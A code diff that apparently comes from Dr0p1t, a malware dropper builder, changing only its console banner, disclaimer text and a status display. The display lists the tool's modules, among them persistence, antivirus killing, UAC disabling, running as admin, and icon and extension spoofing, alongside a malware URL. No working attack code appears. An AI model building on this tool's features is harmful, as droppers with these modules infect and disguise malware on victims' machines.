@@ -50,37 +50,22 @@ def colored_print(text,color):
 
 def print_banner(banner,info,c1,c2):
 	global G, Y, B, R, W , M , C , end
+	end = '\33[97m'
 	def cprint(text,info,c1,c2):
 		print(c1+text+end)
 		print(c2+info+end)
-
-	if c1.lower()=="g":color1=G
-	elif c1.lower()=="y":color1=Y
-	elif c1.lower()=="b":color1=B
-	elif c1.lower()=="r":color1=R
-	elif c1.lower()=="w":color1=W
-	elif c1.lower()=="m":color1=M
-	elif c1.lower()=="c":color1=C
-
-	if c2.lower()=="g":color2=G
-	elif c2.lower()=="y":color2=Y
-	elif c2.lower()=="b":color2=B
-	elif c2.lower()=="r":color2=R
-	elif c2.lower()=="w":color2=W
-	elif c2.lower()=="m":color2=M
-	elif c2.lower()=="c":color2=C
-
-	cprint( banner,info,color1,color2 )
+	cprint( banner,info,c1,c2 )
 
 def warn():
 	global G, Y, B, R, W , M , C , end
 	return '''{} # Disclaimer Alert #{}
   Dr0p1t Framework not responsible
-    for misuse and for illegal purposes. {}
+    for misuse or illegal purposes. {}
       Use it only for {}work{} or {} educational purpose {} !!!'''.format(R,B,Y,R,Y,R,W)
 
 def print_status(args):
 	global G, Y, B, R, W , M , C , end
+	set_colors() # because of some non logical error on some users devices :3
 	if args.s:
 		c1,a = G," Loaded "
 	else:
@@ -127,19 +112,47 @@ def print_status(args):
 	else:
 		c8,h = R,"Unloaded"
 
+	if args.a:
+		c9,i = G," Loaded "
+	else:
+		c9,i = R,"Unloaded"
+
+	if args.runas:
+		c10,j = G," Loaded "
+	else:
+		c10,j = R,"Unloaded"
+
+	if args.spoof:
+		c11,k = G," Loaded "
+		cx4,ext=M,args.spoof
+	else:
+		c11,k = R,"Unloaded"
+		cx4,ext=Y,"None"
+
+	if args.i:
+		c12,l = G," Loaded "
+		cx5,ico=M,args.i
+	else:
+		c12,l = R,"Unloaded"
+		cx5,ico=Y,args.i
+
 
 	print("\n"+Y+"[+] "+W+"Malware url : "+B+"%s"%args.url+W+
 	"\n"+Y+"\n[+] "+W+"Modules :"+
-	"\n\tAdd to startup\t\t: "+c1+"[%s]"%a+W+
-	"\n\tAdd to task\t\t: "+c2+"[%s]"%b+W+
+	"\n\tStartup persistence\t: "+c1+"[%s]"%a+W+
+	"\n\tTask persistence\t: "+c2+"[%s]"%b+W+
+	"\n\tPowershell persistence\t: "+c9+"[%s]"%i+W+ #jklmn
 	"\n\tKill antivirus\t\t: "+c3+"[%s]"%c+W+
 	"\n\tDisable UAC\t\t: "+c8+"[%s]"%h+W+
-	"\n\tLoad BAT file\t\t: "+c4+"[%s]"%d+W+
-	"\n\tLoad PS1 file\t\t: "+c5+"[%s]"%e+W+
-	"\n\tLoad VBS file\t\t: "+c6+"[%s]"%f+W+
+	"\n\tRun as admin\t\t: "+c10+"[%s]"%j+W+
 	"\n\tCompress with UPX\t: "+c7+"[%s]"%g+W+
 
-	"\n"+Y+"\n[+] "+W+"Loaded scripts :"+
+	"\n"+Y+"\n[+] "+W+"Scripts :"+
 	"\n\tBAT file : "+cx1+"%s"%bat+W+
 	"\n\tPS1 file : "+cx2+"%s"%ps1+W+
-	"\n\tVBS file : "+cx3+"%s"%vbs+W+"\n")
+	"\n\tVBS file : "+cx3+"%s"%vbs+W+"\n"+
+
+	"\n"+Y+"\n[+] "+W+"Spoofing :"+
+	"\n\tIcon spoof \t: "+cx5+"%s"%ico+W+
+	"\n\tExtension spoof : "+cx4+"%s"%ext+W+"\n"
+	)
